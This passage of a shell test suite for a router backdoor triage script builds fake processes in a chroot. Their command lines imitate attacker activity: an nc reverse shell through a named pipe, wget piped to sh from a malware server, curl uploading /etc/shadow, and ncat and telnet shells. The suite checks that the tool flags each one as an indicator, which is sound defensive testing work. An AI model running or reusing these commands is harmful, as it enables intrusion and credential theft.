	echo ujaild >"$L/proc/4242/comm"; printf '/usr/sbin/ujaild\0' >"$L/proc/4242/cmdline"
	echo 'another build' >"$L/tmp/ujaild (deleted)"; ln -s '/tmp/ujaild (deleted)' "$L/proc/4242/exe"
	live --no-report >"$L/check.txt"; rc=$?
	expect "ujaild with another hash is still IOC backdoor-proc, not called the known one" '[ $rc = 1 ] && grep -A1 "IOC  *backdoor-proc  *4242" "$L/check.txt" | grep -q "older backdoor: comm=ujaild" && ! grep -q "known second stage" "$L/check.txt"'
	# Processes that only name a server, the shell's address or a path of the malware are
	# not the malware (issues 7 and 20): REVIEW, or INFO for a block, and never stopped.
	# Only --check runs here: these numbers are not processes of the chroot.
	fp() { mkdir -p "$L/proc/$1"; echo "$2" >"$L/proc/$1/comm"; printf "$3" >"$L/proc/$1/cmdline"; ln -s /bin/busybox "$L/proc/$1/exe"; }
	fp 5001 sh 'sh\0-c\0sleep 60; : ping gl-inet.top\0'
	fp 5002 tcpdump 'tcpdump\0-ni\0any\0host\000170.39.226.219\0'
	fp 5003 tail 'tail\0-f\0/etc/config/.gl/install.log\0'
	fp 5004 iptables 'iptables\0-I\0OUTPUT\0-d\00065.20.71.131\0-j\0DROP\0'
	fp 5005 wget 'wget\0-qO-\0http://65.20.71.131:8000/ni.sh\0'
	fp 5006 nc 'nc\000170.39.226.219\0004444\0'
	fp 5007 cat 'cat\0/tmp/f\0'
	fp 5008 sh '/bin/sh\0/etc/glinet/.cache/watch.sh\0'
	fp 5009 sh 'sh\0-c\0rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 170.39.226.219 4444 >/tmp/f\0'
	live --no-report >"$L/procs.txt"
	expect "a process that only names a server, the address or a path is REVIEW" 'grep -A1 "REVIEW  *process  *5001" "$L/procs.txt" | grep -q "names a server of the malware, but does not fetch" && grep -A1 "REVIEW  *process  *5002" "$L/procs.txt" | grep -q "not made like it" && grep -A1 "REVIEW  *process  *5003" "$L/procs.txt" | grep -q "names a path of the malware, but does not run it" && ! grep -qE "IOC  *process  *500[123]" "$L/procs.txt"'
	expect "a process that blocks a server is INFO" 'grep -q "INFO  *process  *5004" "$L/procs.txt" && ! grep -qE "(IOC|REVIEW)  *process  *5004" "$L/procs.txt"'
	expect "a fetch, nc, cat of the pipe, the malware's script and the reported shell line are IOC" 'grep -A1 "IOC  *process  *5005" "$L/procs.txt" | grep -q "fetches from a server" && grep -A1 "IOC  *process  *5006" "$L/procs.txt" | grep -q "remote shell reported" && grep -q "IOC  *process  *5007" "$L/procs.txt" && grep -q "IOC  *process  *5008" "$L/procs.txt" && grep -A1 "IOC  *process  *5009" "$L/procs.txt" | grep -q "remote shell reported"'
	rm -r "$L"/proc/500?
	# variants of the shell, a script started with ".", and a name that tries to hide a process
	fp 5011 ncat 'ncat\000170.39.226.219\0004444\0-e\0/bin/sh\0'
	fp 5012 sh 'sh\0-c\0telnet 170.39.226.219 4444 | /bin/sh | telnet 170.39.226.219 4445\0'
	fp 5013 sh 'sh\0-c\0. /etc/config/.gl/boot.sh\0'
	fp 5014 nc 'nc\000170.39.226.219\0004444\0-e\0/bin/sh\0--\0gl-helper-triage\0'
	fp 5015 sh 'sh\0/root/gl-helper-triage.sh\0--check\0'
	live --no-report >"$L/procs2.txt"
	expect "ncat, telnet, a sourced script of the malware and a hiding name are IOC; this script itself is not" '(for n in 5011 5012 5013 5014; do grep -q "IOC  *process  *$n" "$L/procs2.txt" || exit 1; done) && ! grep -q "process  *5015" "$L/procs2.txt"'
	rm -r "$L"/proc/501?
	# a respawn loop, more tools, a program from /tmp, a probe, a block taken away, and this
	# script's name on a program that is not this script (review of 2.53)
	mkdir -p "$L/tmp/self"; cp "$T" "$L/tmp/self/gl-helper-triage.sh"; echo payload >"$L/tmp/gl-helper-triage.sh"; echo payload >"$L/tmp/gb"
	fp 5021 sh 'sh\0-c\0while :; do /etc/glinet/.cache/gl-helper; sleep 30; done\0'
	fp 5022 dbclient 'dbclient\0-N\0-R\0002222:127.0.0.1:22\0u@66.245.219.252\0'
	fp 5023 gb '/tmp/gb\00065.20.71.131\0008000\0'; ln -sf /tmp/gb "$L/proc/5023/exe"
	fp 5024 gl-helper-triag '/tmp/gl-helper-triage.sh\00065.20.71.131\0'; ln -sf /tmp/gl-helper-triage.sh "$L/proc/5024/exe"
	fp 5025 nc 'nc\0-z\0-w\0003\00065.20.71.131\0008000\0'
	fp 5026 iptables 'iptables\0-D\0OUTPUT\0-d\00065.20.71.131\0-j\0DROP\0'
	fp 5027 sh '/bin/sh\0-c\0sh /tmp/self/gl-helper-triage.sh --archive -o /mnt/usb/gl-helper\0'
	live --no-report >"$L/procs3.txt"
	expect "a loop around the malware, dbclient, a program from /tmp and one named like this script are IOC" '(for n in 5021 5022 5023 5024; do grep -q "IOC  *process  *$n" "$L/procs3.txt" || exit 1; done)'
	expect "a probe and a block taken away are REVIEW; this script from cron is skipped" 'grep -q "REVIEW  *process  *5025" "$L/procs3.txt" && grep -q "REVIEW  *process  *5026" "$L/procs3.txt" && ! grep -q "INFO  *process  *5026" "$L/procs3.txt" && ! grep -q "process  *5027" "$L/procs3.txt"'
	rm -r "$L"/proc/502? "$L/tmp/self"; rm -f "$L/tmp/gl-helper-triage.sh" "$L/tmp/gb"
	# pidof in $( ), an upload into /dev/null, a check of a block, timeout, a newline in sh -c
	# (third review of 2.53)
	fp 5031 sh 'sh\0-c\0PID=$(pidof gl-helper); [ -n "$PID" ] && logger running\0'
	fp 5032 curl 'curl\0-s\0-o\0/dev/null\0-d\0@/etc/shadow\0http://65.20.71.131:8000/up\0'
	fp 5033 sh 'sh\0-c\0wget -qO- -T 5 http://65.20.71.131:8000/ >/dev/null 2>&1 && logger -t csa down\0'
	fp 5034 sh 'sh\0-c\0timeout -s KILL 60 /etc/config/.gl/gl-helper\0'
	fp 5035 sh 'sh\0-c\0sleep 5\n/etc/glinet/.cache/gl-helper\0'
	live --no-report >"$L/procs4.txt"
	expect "pidof in \$( ) and a check of a block are REVIEW; an upload, timeout and a second line are IOC" 'grep -q "REVIEW  *process  *5031" "$L/procs4.txt" && grep -q "REVIEW  *process  *5033" "$L/procs4.txt" && ! grep -qE "IOC  *process  *503[13]" "$L/procs4.txt" && (for n in 5032 5034 5035; do grep -q "IOC  *process  *$n" "$L/procs4.txt" || exit 1; done)'
	rm -r "$L"/proc/503?
	# programs of the malware under other names (issue 25): known by their packer when they
	# run from a deleted file or a RAM disk, or when the file was found by its packer
	pk() { { printf '\177ELF'; head -c 2000 /dev/zero | tr '\0' x; printf 'Node hardened executable packer; format NPK2'; } >"$1"; }
	mkdir -p "$L/etc/glinet/.cache"
	pk "$L/tmp/kworker (deleted)"; pk "$L/tmp/dnsmasq2"; pk "$L/etc/glinet/.cache/sysd"; printf '\177ELF another program' >"$L/tmp/plain (deleted)"
	fp 5041 kworker 'kworker\0'; ln -sfn "/tmp/kworker (deleted)" "$L/proc/5041/exe"
	fp 5042 dnsmasq 'dnsmasq\0-k\0'; ln -sfn /tmp/dnsmasq2 "$L/proc/5042/exe"
	fp 5043 sysd 'sysd\0'; ln -sfn /etc/glinet/.cache/sysd "$L/proc/5043/exe"
	fp 5044 plain 'plain\0'; ln -sfn "/tmp/plain (deleted)" "$L/proc/5044/exe"
	live --no-report >"$L/procs5.txt"
	grep -E '^ +(IOC|REVIEW) ' "$L/procs5.txt"
	expect "a packed program from a deleted file, from /tmp and from a file found by its packer is IOC process" '(for n in 5041 5042 5043; do grep -q "IOC  *process  *$n" "$L/procs5.txt" || exit 1; done) && grep -q "IOC  *marker  */etc/glinet/.cache/sysd" "$L/procs5.txt"'
	expect "another program from a deleted file stays REVIEW deleted-exe" 'grep -q "REVIEW  *deleted-exe  *5044" "$L/procs5.txt" && ! grep -q "IOC  *process  *5044" "$L/procs5.txt"'
	rm -r "$L"/proc/504? "$L/etc/glinet"; rm -f "$L/tmp/kworker (deleted)" "$L/tmp/dnsmasq2" "$L/tmp/plain (deleted)"
	# The report keeps the owner's lines and names, and says so in bold before it asks
	mkdir -p "$L/etc"; printf '/etc/glinet/.cache/gl-helper &\niptables -t nat -A PREROUTING -p tcp --dport 2222 -j DNAT --to 192.168.8.50:22\niptables -I FORWARD -s 192.168.8.60 -d 65.20.71.131 -j DROP\niptables -t nat -A PREROUTING -d 127.0.0.1 -j DNAT --to-destination 127.0.0.1\nexit 0\n' >"$L/etc/rc.local"
	{ printf 'root:x:0:0:root:/root:/bin/ash\njsmith-admin:x:0:0::/root:/bin/ash\n'; for n in 1 2 3 4 5 6 7 8; do printf 'zz%s:x:0:0::/root:/bin/ash\n' "$n"; done; } >"$L/etc/passwd"
	live >"$L/ask2.txt"
	expect "the summary counts a line with the owner's and the attacker's address, not 127.0.0.1" 'grep -q "2 of them hold IP addresses that are not the attacker" "$L/ask2.txt"'
	expect "the summary names the accounts, and how many more the report holds" 'grep -q "Also the name of each account the firmware does not have: jsmith-admin zz1 .* zz7 and 1 more" "$L/ask2.txt" && grep -q "What stands in the" "$L/ask2.txt" && ! grep -q "Not sent: host name, keys, passwords" "$L/ask2.txt"'
	rm "$L/etc/rc.local" "$L/etc/passwd"
	# review of 2.55: command lines are read as sh reads them, and print nothing raw
	fp 5051 vi 'vi\0/usr/bin/monitord\0'
	fp 5052 tail 'tail\0-f\0/var/log/monitord.pid.log\0'
	fp 5053 sh 'sh\0-c\0S=65.20.71.131; wget -qO- http://$S:8000/ni.sh | sh\0'
	fp 5054 sh '/bin/sh\0/etc/glinet/.cache//watch.sh\0'
	fp 5055 sleep 'sleep\000100\0\033]0;x\007\033[1A\0'
	live --no-report >"$L/procs6.txt"
	grep -E '^ +(IOC|REVIEW) ' "$L/procs6.txt" | tr '\033' '~'
	expect "an editor or tail that names monitord is not the backdoor" '! grep -qE "(process|backdoor-proc)  *505[12]" "$L/procs6.txt"'
	expect "a server in a variable and a path with // are IOC process" 'grep -q "IOC  *process  *5053" "$L/procs6.txt" && grep -q "IOC  *process  *5054" "$L/procs6.txt"'
	expect "no escape sequence of a command line reaches the screen" '! grep -q "$(printf "\033")" "$L/procs6.txt"'
	rm -r "$L"/proc/505?
	# a running device with /rom but no upper layer to be seen: the places that start
	# programs are read all the same; an upper layer that something hides is said
	mkdir -p "$L/rom/bin" "$L/rom/etc" "$L/etc/init.d"; cp "$BB" "$L/rom/bin/busybox"
	echo "DISTRIB_ID='OpenWrt'" >"$L/etc/openwrt_release"; cp "$L/etc/openwrt_release" "$L/rom/etc/"
	printf '#!/bin/sh\n/etc/config/.gl/gl-helper &\n' >"$L/etc/init.d/evil"
	live --no-report >"$L/rom.txt"
	expect "with /rom but no upper layer, an init script that starts the malware is IOC" 'grep -q "IOC  *persist-ref  */etc/init.d/evil" "$L/rom.txt"'
	mkdir -p "$L/proc"; echo "overlayfs:/overlay/upper / overlay rw,noatime,lowerdir=/,upperdir=/overlay/upper,workdir=/overlay/work 0 0" >"$L/proc/mounts"
	live --no-report >"$L/hid.txt"
	expect "an upper layer that cannot be seen is REVIEW overlay-hidden" 'grep -q "REVIEW  *overlay-hidden  */overlay/upper" "$L/hid.txt"'
	rm -r "$L/rom" "$L/etc/init.d" "$L/proc/mounts" "$L/etc/openwrt_release"
	# Tools that are not busybox applets (issue 8): run only when they are the base image's.
	# The chroot gets a base image with the same busybox and an iptables-save that prints
	# the rule the attack leaves; first the same file in the system, then a changed one.
	mkdir -p "$L/rom/bin" "$L/rom/usr/sbin" "$L/usr/sbin"; cp "$BB" "$L/rom/bin/busybox"
	printf '#!/bin/sh\necho "*nat"\necho "-A SDWAN_IP_MAPPING -d 127.0.0.1/32 -j DNAT --to-destination 127.0.0.1"\necho COMMIT\n' >"$L/rom/usr/sbin/iptables-save"
	chmod +x "$L/rom/usr/sbin/iptables-save"; cp -p "$L/rom/usr/sbin/iptables-save" "$L/usr/sbin/iptables-save"
	livep() { PATH=/usr/sbin:/bin TMPDIR=/tmp GL_TRIAGE_REPORT_URL=http://127.0.0.1:9/ chroot "$L" /bin/sh /t.sh --no-device-id "$@" </dev/null 2>&1; }
	livep --no-report >"$L/tool.txt"
	expect "a tool that is the base image's is run: its rule is found" 'grep -q "Trusted tools  *yes (/rom/bin/busybox" "$L/tool.txt" && grep -q "IOC  *fw-rule" "$L/tool.txt" && ! grep -q "tool-skipped" "$L/tool.txt"'
	echo 'echo changed >/dev/null' >>"$L/usr/sbin/iptables-save"
	livep --no-report >"$L/tool.txt"
	grep -E -A1 'tool-skipped' "$L/tool.txt"
	expect "a changed tool is not run and is listed as skipped" 'grep -q "INFO  *tool-skipped  */usr/sbin/iptables-save" "$L/tool.txt" && ! grep -q "IOC  *fw-rule" "$L/tool.txt"'
	rm -r "$L/rom" "$L/usr"
	umount "$L/dev/null"
else
	echo "  SKIP: needs a statically linked busybox"
fi

echo "=== firmware that cleans up by itself (GL.iNet's gl-sdk4-system-check, router firmware 4.9.3)"
D=$(mkscen vclean "$OWL"); U=$D/u
mkdir -p "$U/usr/lib/opkg"; printf 'Package: gl-sdk4-cloud\nVersion: git-2026.325.35972-e271f36\n\nPackage: gl-sdk4-system-check\nVersion: 1\n\n' >"$U/usr/lib/opkg/status"
mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"
expect "the cleanup package is named, and the clean result says what it is worth" 'grep -q "INFO  *vendor-cleanup" "$D/check.txt" && grep -q "cleans up by itself" "$D/check.txt" && grep -q "Not proof that nothing happened" "$D/check.txt" && grep -q "no gl-helper indicators found" "$D/check.txt"'
expect "the code carries it, so the page can say the same" 'readcode "$D/check.txt" 1 csa.gl-i.net | grep -q " k=vc "'
umount "$D/m"
D=$(mkscen noclean "$OWL"); U=$D/u
mkdir -p "$U/usr/lib/opkg"; printf 'Package: gl-sdk4-cloud\nVersion: git-2026.146.23211-bea5eca\n\n' >"$U/usr/lib/opkg/status"
mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"
expect "without that package nothing is said about a cleanup, the limit of a clean result still is" '! grep -q "vendor-cleanup\|cleans up by itself" "$D/check.txt" && grep -q "Not proof that nothing happened" "$D/check.txt" && ! readcode "$D/check.txt" 1 csa.gl-i.net | grep -q "vc"'
umount "$D/m"

echo "=== the state file on firmware with the fix (issue 19)"
D=$(mkscen fresh "$OWL"); U=$D/u
mkdir -p "$U/usr/lib/opkg" "$U/etc"; printf 'Package: gl-sdk4-system-check\nVersion: 1\n\n' >"$U/usr/lib/opkg/status"
echo '2026-11-22 12:36:07' >"$U/etc/version.date"
# as on a real device: written at the first start, before the clock is set
echo '{}' >"$U/etc/board.json"; touch -d '1970-01-01 00:00:11 UTC' "$U/etc/board.json"
: >"$U/etc/mp_ip_mapping_info"; touch -d '2026-11-22 17:26:53 UTC' "$U/etc/mp_ip_mapping_info"
# the SD-WAN module's other state files, written in the same seconds at its start
echo '{}' >"$U/etc/mp_connection_info"; touch -d '2026-11-22 17:26:52 UTC' "$U/etc/mp_connection_info"
mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
expect "an empty state file written after the fixed firmware was built is REVIEW, not a trace" '[ $rc = 0 ] && grep -q "REVIEW  *state-file  */etc/mp_ip_mapping_info" "$D/check.txt" && grep -q "written after this firmware was built" "$D/check.txt" && ! grep -q "IOC  *cloud-command" "$D/check.txt" && grep -q "no gl-helper indicators found" "$D/check.txt"'
umount "$D/m"
touch -d '2026-11-21 02:50:11 UTC' "$U/etc/mp_ip_mapping_info"
mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
expect "one from before the build day stays a trace, whatever the date of board.json" '[ $rc = 1 ] && grep -q "IOC  *cloud-command  */etc/mp_ip_mapping_info" "$D/check.txt"'
umount "$D/m"
# after the build day, but on its own: the attack on the old firmware before the upgrade (review of 2.54)
touch -d '2026-11-22 22:10:00 UTC' "$U/etc/mp_ip_mapping_info"
mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
expect "one written after the build day but not with the module's other files stays a trace" '[ $rc = 1 ] && grep -q "IOC  *cloud-command  */etc/mp_ip_mapping_info" "$D/check.txt"'
umount "$D/m"

echo "=== binary files hold NUL bytes (issue 24): names behind them must still be found"
# Compiled Lua keeps each name behind a length of four bytes, three of them NUL. A real
# program holds its loader and libraries between NUL bytes as well.
D=$(mkscen nul "$OWL"); U=$D/u
mkdir -p "$U/usr/lib"
{ printf '\033LuaQ\000\001\004\004\004\010\000'; head -c 1500 /dev/zero; printf '\022\000\000\000get_mac_form_proc\000\015\000\000\000domain_table\000'; } >"$U/usr/lib/hidden-loader"
mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"
expect "the loader under another name is found although NUL bytes stand before its names" 'grep -q "IOC  *backdoor-file  */usr/lib/hidden-loader" "$D/check.txt"'
umount "$D/m"
OWN=$BASE/openwrt-rom-nul
cp -a "$OWL" "$OWN"; mkdir -p "$OWN/lib"
{ printf '\177ELF\002\001\001\000\000\000\000\000\000\000\000\000'; head -c 600 /dev/zero; printf '/lib/ld-musl-test.so.1\000'; head -c 300 /dev/zero; printf '\000libgcc_s.so.1\000libc.so\000'; head -c 200 /dev/zero; } >"$OWN/bin/busybox"
echo 'the real libc' >"$OWN/lib/libc.so"; echo 'the real libgcc' >"$OWN/lib/libgcc_s.so.1"; ln -sf libc.so "$OWN/lib/ld-musl-test.so.1"
D=$(mkscen nullib "$OWN"); U=$D/u
mkdir -p "$U/lib"; echo 'another libc' >"$U/lib/libc.so"
mnt "$D" "$OWN"
run "$D" "$OWN" --check >"$D/check.txt"
expect "a changed libc is found although the program names it between NUL bytes" 'grep -q "REVIEW  *changed-lib  */lib/libc.so" "$D/check.txt"'
umount "$D/m"

echo "=== every run says how old this version is and how to get the current one"
D=$(mkscen age "$OWL"); mnt "$D" "$OWL"
# fresh means released this hour: the real RELEASED ages, and a run a day later would fail
TNOW=$T; T=$BASE/fresh-version.sh; sed "s|^RELEASED=.*|RELEASED='$(date -u '+%Y-%m-%d %H:%M UTC')'|" "$TNOW" >"$T"
run "$D" "$OWL" --check >"$D/check.txt"
T=$TNOW
expect "a fresh version: its release time and the command to update" 'grep -q "^   Released  *20[0-9-]* [0-9:]* UTC" "$D/check.txt" && grep -q "^   Update  *sh .* --update" "$D/check.txt" && ! grep -q "newer version is likely" "$D/check.txt"'
TNOW=$T; T=$BASE/old-version.sh; sed "s|^RELEASED=.*|RELEASED='2026-11-01 08:00 UTC'|" "$TNOW" >"$T"
run "$D" "$OWL" --check >"$D/check.txt"
expect "an old version: its age in days, and that a newer one is likely" 'grep -q "^   Released  *2026-11-01 08:00 UTC, .*[0-9][0-9]* days ago" "$D/check.txt" && grep -q "newer version is likely.*--update" "$D/check.txt"'
T=$TNOW
umount "$D/m"

echo "=== --update: only a newer version with a good signature replaces the script"
SIGNIFY=$(command -v signify-openbsd 2>/dev/null || command -v signify 2>/dev/null || true)
if [ -n "$SIGNIFY" ] && command -v python3 >/dev/null 2>&1; then
	W=$BASE/update; mkdir -p "$W/www" "$W/bin" "$W/dev"
	for k in k1 k2 kx; do "$SIGNIFY" -G -n -p "$W/$k.pub" -s "$W/$k.sec"; done
	keys="$(sed -n 2p "$W/k1.pub") $(sed -n 2p "$W/k2.pub")"
	# usign as the firmware has it takes the options signify takes
	printf '#!/bin/sh\nexec %s "$@"\n' "$SIGNIFY" >"$W/bin/usign"; chmod +x "$W/bin/usign"
	mkver() { sed -e "s|^UPDATE_KEYS='.*'\$|UPDATE_KEYS='$keys'|" -e "s|^VERSION=.*|VERSION=$1|" "$T" >"$2"; }
	serve() { mkver "$1" "$W/www/fix"; "$SIGNIFY" -S -s "$W/$2.sec" -m "$W/www/fix" -x "$W/www/fix.sig"; }
	upd() { env PATH="$W/bin:$TRIAGE_PATH" GL_TRIAGE_UPDATE_URL=http://127.0.0.1:18473/fix $TRIAGE_SH "$W/dev/t.sh" --update >"$W/out.txt" 2>&1; }
	ver() { sed -n 's/^VERSION=//p' "$W/dev/t.sh"; }
	(cd "$W/www" && exec python3 -m http.server 18473 --bind 127.0.0.1 >/dev/null 2>&1) & SRV=$!
	sleep 1
	mkver 2.60 "$W/dev/t.sh"; chmod 755 "$W/dev/t.sh"; serve 2.61 k1
	upd; rc=$?
	[ $rc = 0 ] || { echo "    exit $rc, and the script said:"; sed 's/^/    | /' "$W/out.txt"; }
	expect "a newer version with a good signature replaces the script, the old one is kept" '[ $rc = 0 ] && [ "$(ver)" = 2.61 ] && grep -q "^VERSION=2.60$" "$W/dev/t.sh.old" && grep -q "Updated to version 2.61" "$W/out.txt" && cmp -s "$W/dev/t.sh" "$W/www/fix"'
	expect "the new script keeps the mode of the old one" '[ "$(stat -c %a "$W/dev/t.sh")" = 755 ] && [ "$(stat -c %a "$W/dev/t.sh.old")" = 755 ]'
	upd; rc=$?
	expect "the same version again: nothing to do" '[ $rc = 0 ] && grep -q "This is the current version" "$W/out.txt" && [ "$(ver)" = 2.61 ]'
	serve 2.62 k1; echo 'echo added on the way' >>"$W/www/fix"
	upd; rc=$?
	expect "a download changed on the way is refused" '[ $rc = 4 ] && grep -q "signature does not fit" "$W/out.txt" && [ "$(ver)" = 2.61 ]'
	serve 2.62 kx
	upd; rc=$?
	expect "a signature made with an unknown key is refused" '[ $rc = 4 ] && grep -q "signature does not fit" "$W/out.txt" && [ "$(ver)" = 2.61 ]'
	serve 2.50 k1
	upd; rc=$?
	expect "an older version is refused although its signature is good" '[ $rc = 4 ] && grep -q "older than this one" "$W/out.txt" && [ "$(ver)" = 2.61 ]'
	serve 2.62 k2
	upd; rc=$?
	expect "the spare key is taken as well" '[ $rc = 0 ] && [ "$(ver)" = 2.62 ]'
	serve 2.63 k1; rm "$W/www/fix.sig"
	upd; rc=$?
	expect "without a signature nothing is replaced" '[ $rc = 4 ] && grep -q "no signature is served" "$W/out.txt" && [ "$(ver)" = 2.62 ]'
	serve 2.63 k1
	env PATH="$TRIAGE_PATH" GL_TRIAGE_UPDATE_URL=http://127.0.0.1:18473/fix $TRIAGE_SH "$W/dev/t.sh" --update >"$W/out.txt" 2>&1; rc=$?
	expect "without usign the script says so and replaces nothing where nobody can be asked" '[ $rc = 4 ] && grep -q "has no usign" "$W/out.txt" && grep -q "add --unsigned" "$W/out.txt" && [ "$(ver)" = 2.62 ]'
	env PATH="$TRIAGE_PATH" GL_TRIAGE_UPDATE_URL=http://127.0.0.1:18473/fix $TRIAGE_SH "$W/dev/t.sh" --update --unsigned >"$W/out.txt" 2>&1; rc=$?
	expect "with --unsigned it updates all the same and says that nothing was checked" '[ $rc = 0 ] && [ "$(ver)" = 2.63 ] && grep -q "signature was NOT checked" "$W/out.txt"'
	serve 2.50 k1
	env PATH="$TRIAGE_PATH" GL_TRIAGE_UPDATE_URL=http://127.0.0.1:18473/fix $TRIAGE_SH "$W/dev/t.sh" --update --unsigned >"$W/out.txt" 2>&1; rc=$?
	expect "an older version is refused without the check as well" '[ $rc = 4 ] && grep -q "older than this one" "$W/out.txt" && [ "$(ver)" = 2.63 ]'
	serve 2.64 k1; echo 'echo added on the way' >>"$W/www/fix"
	env PATH="$W/bin:$TRIAGE_PATH" GL_TRIAGE_UPDATE_URL=http://127.0.0.1:18473/fix $TRIAGE_SH "$W/dev/t.sh" --update --unsigned >"$W/out.txt" 2>&1; rc=$?
	expect "where usign is there, --unsigned is not a way around a signature that does not fit" '[ $rc = 4 ] && [ "$(ver)" = 2.63 ]'
	kill "$SRV" 2>/dev/null
else
	echo "  SKIP: needs signify (signify-openbsd) and python3"
fi

echo "=== the fingerprint check (2.60): fingerprints only, and an answer can only make the result worse"
# A running device, as for the report's note: a chroot that holds a static busybox and
# nothing else, with a plain file of random bytes as /dev/urandom. The community list is a
# small server on this machine. It keeps each request it gets (req.N, and its Content-Type
# in type.N), repeats the request's number, and answers each line with the word its table
# gives the file's SHA-256 (unknown when there is none). Its mode breaks the answer on
# purpose; a broken answer carries EVIL, which must never reach the screen.
BB=$(command -v busybox)
if [ -n "$BB" ] && file -L "$BB" | grep -q 'statically linked' && command -v python3 >/dev/null 2>&1; then
	K=$BASE/lookup; KS=$K/srv; KL=$K/live
	mkdir -p "$KS" "$KL/bin" "$KL/tmp" "$KL/dev" "$KL/etc"
	cp "$BB" "$KL/bin/busybox"; cp "$T" "$KL/t.sh"; : >"$KL/dev/null"
	mount --bind /dev/null "$KL/dev/null"; chroot "$KL" /bin/busybox --install -s /bin
	head -c 4096 /dev/urandom >"$KL/dev/urandom"
	cat >"$K/srv.py" <<'EOF'
import hashlib, http.server, os, sys, time
port, d = int(sys.argv[1]), sys.argv[2]
def rd(name, default=''):
    try:
        with open(os.path.join(d, name)) as f:
            return f.read().strip()
    except OSError:
        return default
class H(http.server.BaseHTTPRequestHandler):
    def log_message(self, *a):
        pass
    def do_POST(self):
        body = self.rfile.read(int(self.headers.get('Content-Length') or 0))
        k = len([x for x in os.listdir(d) if x.startswith('req.')]) + 1
        with open(os.path.join(d, 'req.%d' % k), 'wb') as f:
            f.write(body)
        with open(os.path.join(d, 'type.%d' % k), 'w') as f:
            f.write(self.headers.get('Content-Type', ''))
        mode = rd('mode', 'ok')
        # "modes" names a mode for each of the next requests, one after the other
        seq = rd('modes').split()
        if seq:
            mode = seq.pop(0)
            with open(os.path.join(d, 'modes'), 'w') as f:
                f.write(' '.join(seq))
        if mode == '500':
            self.send_response(500)
            self.send_header('Content-Type', 'text/plain')
            self.end_headers()
            self.wfile.write(b'error\n')
            return
        lines = body.decode('latin-1').split('\n')
        nonce = lines[2][6:] if len(lines) > 2 else ''
        items = [l for l in lines[3:] if l]
        table = dict(l.split() for l in rd('table').splitlines() if l.strip())
        rows = [i + ' ' + table.get(i.split(' ')[-1], 'unknown') for i in items]
        head = ['csa-2026-01-lookup-answer 1', 'nonce ' + nonce, 'at 2026-11-24 16:40 UTC']
        if mode == 'nonce':
            head[1] = 'nonce ' + ('0123456789abcdef' * 2 if nonce != '0123456789abcdef' * 2 else 'f' * 32)
        if mode == 'unasked':
            rows[0] = rows[0][:65] + hashlib.sha256(b'another file').hexdigest() + rows[0][129:]
        if mode == 'word':
            rows[0] = rows[0].rsplit(' ', 1)[0] + ' known_EVIL'
        if mode == 'missing':
            rows = rows[:-1]
        if mode == 'extra':
            rows.append('note EVIL')
        if mode == 'order':
            rows.reverse()
        if mode == 'esc':
            head[2] += '\x1b]0;EVIL\x07\x1b[2J'
        if mode == 'ctrl':
            rows[0] += '\x08\x08\x08\x08EVIL'
        text = '\n'.join(head + rows) + '\n'
        if mode == 'big':
            text += ('EVIL' * 25 + '\n') * 90
        if mode == 'nolf':
            text = text[:-1]
        if mode == 'crlf':
            text = text.replace('\n', '\r\n')
        if mode == 'empty':
            text = ''
        if mode == 'slow':
            # a byte every two seconds, for a minute: no timeout of a tool ends it
            self.send_response(200)
            self.send_header('Content-Type', 'text/plain')
            self.send_header('Content-Length', '30')
            self.end_headers()
            try:
                for i in range(30):
                    self.wfile.write(b'E')
                    self.wfile.flush()
                    time.sleep(2)
            except OSError:
                pass
            return
        if mode == 'endless':
            # no end and no length: only the script's own limit stops it
            self.send_response(200)
            self.send_header('Content-Type', 'text/plain')
            self.end_headers()
            try:
                while True:
                    self.wfile.write(b'E' * 65536)
            except OSError:
                pass
            return
        if mode == 'dribble':
            # the header, a line every 8 seconds for two minutes: no idle timeout of a tool ends it
            try:
                self.wfile.write(b'HTTP/1.0 200 OK\r\n')
                self.wfile.flush()
                for i in range(15):
                    time.sleep(8)
                    self.wfile.write(b'X-Wait: %d\r\n' % i)
                    self.wfile.flush()
            except OSError:
                pass
            return
        data = text.encode('latin-1')
        if mode == 'huge':
            data = data + b'EVIL\n' * 2000000
        if mode == 'high':
            data = data.replace(b'known_bad', b'known_bad\xe2\x80\xaeEVIL', 1)
        self.send_response(200)
        self.send_header('Content-Type', 'text/plain; charset=utf-8')
        self.send_header('Content-Length', str(len(data)))
        self.end_headers()
        try:
            self.wfile.write(data)
        except OSError:
            pass
srv = http.server.ThreadingHTTPServer(('127.0.0.1', port), H)
open(os.path.join(d, 'ready'), 'w').close()
srv.serve_forever()
EOF
	(exec python3 "$K/srv.py" 18474 "$KS" >/dev/null 2>&1) & KSRV=$!
	for i in 1 2 3 4 5 6 7 8 9 10; do [ -f "$KS/ready" ] && break; sleep 0.5; done
	KURL=http://127.0.0.1:18474/lookup
	lk() { TMPDIR=/tmp GL_TRIAGE_REPORT_URL=http://127.0.0.1:9/ GL_TRIAGE_LOOKUP_URL=$KURL chroot "$KL" /bin/sh /t.sh --no-device-id "$@" </dev/null 2>&1; }
	nreq() { ls "$KS" | grep -c '^req\.'; }
	kmode() { echo "$1" >"$KS/mode"; }
	# the answer for a file of the chroot: ktable tmp/.dg known_bad tmp/.lp known_safe ...
	ktable() { : >"$KS/table"; while [ $# -gt 1 ]; do echo "$(sha256sum <"$KL/$1" | cut -c1-64) $2" >>"$KS/table"; shift 2; done; }
	# the result code printed in a file: "<first 7 characters> <the 3 bits before rv> <rv> <check character fits>"
	codebits() {
		grep -o 'csa\.gl-i\.net/#[0-9A-Z]*' "$1" | head -n 1 | sed 's/.*#//' | awk '{ a = "0123456789ABCDEFGHJKMNPQRSTVWXYZ"; s = 0
			for (i = 1; i <= 8; i++) s += i * (index(a, substr($0, i, 1)) - 1)
			v = index(a, substr($0, 8, 1)) - 1
			print substr($0, 1, 7), int(v / 4), v % 4, (substr(a, s % 31 + 1, 1) == substr($0, 9, 1)) }'
	}
	V=$(sed -n 's/^VERSION=//p' "$T")
	kmode ok; ktable
	# something listed for review, but no file with a fingerprint: a directory
	mkdir "$KL/tmp/.dg"
	lk --lookup >"$K/none.txt"; rc=$?
